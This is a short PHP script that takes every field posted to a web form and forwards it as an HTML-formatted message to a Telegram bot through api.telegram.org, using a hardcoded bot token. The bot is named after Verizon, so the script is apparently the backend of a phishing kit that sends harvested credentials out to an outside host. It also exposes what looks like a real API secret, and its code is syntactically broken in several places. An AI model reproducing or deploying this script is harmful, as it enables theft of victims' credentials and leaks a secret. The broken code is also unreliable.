<?php

$content = '';

foreach ($_POST as $key => $value) {

if($value){

$content .= "<b>$key</b>: <i>$value</i>\n";

}

if(trim($content))(

$content ="<b>Message from Site:</b>\n".$content;

$apiToken = "7242600333:AAGySJSAR4D4ZoWAB2evyv86Xd-teI4WQxA";

$data = [

'chat_id' => '@Bobzyverizonbot',

'text' => $content,

'parse_mode' =>'HTML' 

];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data))
}
?>